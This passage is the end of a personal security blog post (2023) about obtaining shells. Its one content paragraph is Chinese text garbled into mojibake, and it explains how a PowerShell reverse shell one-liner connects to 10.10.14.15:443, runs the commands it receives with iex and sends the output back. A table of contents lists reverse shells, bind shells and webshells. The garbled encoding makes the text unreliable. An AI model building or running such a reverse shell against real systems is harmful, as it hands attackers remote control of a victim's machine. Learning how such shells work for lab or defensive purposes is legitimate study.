<p>é¦–å…ˆæ–°å»ºä¸€ä¸ªTCPClientå¯¹è±¡ï¼Œåœ°å€ä¸º 10.10.14.15:443ï¼Œæ¥ç€ç”¨GetStream()æ–¹æ³•è·å–ç”¨äºè¯»å–å’Œå†™å…¥æ•°æ®çš„NetworkStreamå¯¹è±¡ã€‚æ¥ä¸‹æ¥ï¼Œåˆ›å»ºä¸€ä¸ª65535å­—èŠ‚çš„å­—èŠ‚æ•°ç»„ï¼Œå¹¶åˆå§‹åŒ–æ¯ä¸ªå…ƒç´ ä¸º0ã€‚ç„¶åä½¿ç”¨ä¸€ä¸ªwhileå¾ªç¯ç­‰å¾…ä»æœåŠ¡å™¨è¯»å–æ•°æ®ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨å­—èŠ‚æ•°ç»„ä¸­ã€‚å½“è¯»å–æ“ä½œè¿”å›é›¶æ—¶ï¼ˆ-ne â€“&gt; ä¸ç­‰äº0ï¼‰ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å·²å…³é—­è¿æ¥ï¼Œæ­¤æ—¶è„šæœ¬å°†å…³é—­ TCPClient å¯¹è±¡å¹¶é€€å‡ºã€‚åœ¨è¯»å–åˆ°æœåŠ¡å™¨å‘é€çš„æ•°æ®åï¼Œä½¿ç”¨ New-Object å‘½ä»¤å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º ASCII ç¼–ç å­—ç¬¦ä¸²ã€‚ç„¶åï¼Œä½¿ç”¨ iex å‘½ä»¤æ‰§è¡Œå­—ç¬¦ä¸²ä½œä¸º PowerShell ä»£ç ï¼Œå¹¶ä½¿ç”¨ Out-String å‘½ä»¤å°†è¾“å‡ºè½¬æ¢ä¸ºå­—ç¬¦ä¸²å¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡ $sendback ä¸­ã€‚æ¥ä¸‹æ¥ï¼Œå°† $sendback å’Œå½“å‰ç›®å½•è·¯å¾„æ‹¼æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²å¹¶å°†å…¶å­˜å‚¨åœ¨å˜é‡ $sendback2 ä¸­ã€‚æœ€åï¼Œä½¿ç”¨ [text.encoding]::ASCII ç±»çš„ GetBytes() æ–¹æ³•å°† $sendback2 è½¬æ¢ä¸ºä¸€ä¸ªå­—èŠ‚æ•°ç»„ï¼Œå¹¶ä½¿ç”¨ NetworkStream å¯¹è±¡çš„ Write() æ–¹æ³•å°†å…¶å‘é€å›æœåŠ¡å™¨ã€‚</p>
</aside>
	  <div class="article-footer-copyright">

    æœ¬åšå®¢é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™…è®¸å¯åè®®(CC BY-NC-SA 4.0) å‘å¸ƒ.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/04/19/hack-wordpress/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/04/16/Linuxç£ç›˜æ‰©å®¹å’ŒæŒ‚è½½/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-04-16 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ä¸€äº›é›¶ç¢çš„çŸ¥è¯†/">ä¸€äº›é›¶ç¢çš„çŸ¥è¯†<span>1</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Shell"><span class="toc-article-text">Shell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Types-of-Shells"><span class="toc-article-text">Types of Shells</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#ReverseShell"><span class="toc-article-text">ReverseShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Windows"><span class="toc-article-text">Windows</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Linux"><span class="toc-article-text">Linux</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#BindShell"><span class="toc-article-text">BindShell</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#upgrading-TTY"><span class="toc-article-text">upgrading TTY</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#webshell"><span class="toc-article-text">webshell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#antak-webShell"><span class="toc-article-text">antak webShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#php-webShell"><span class="toc-article-text">php webShell</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%89%A7%E8%A1%8Cshell"><span class="toc-article-text">æ‰§è¡Œshell</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%80%E4%BA%9B%E8%B5%B7shell%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-article-text">ä¸€äº›èµ·shellçš„å‘½ä»¤</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#PowerShell-one-liner"><span class="toc-article-text">PowerShell one-liner</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 Ak4izZ's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
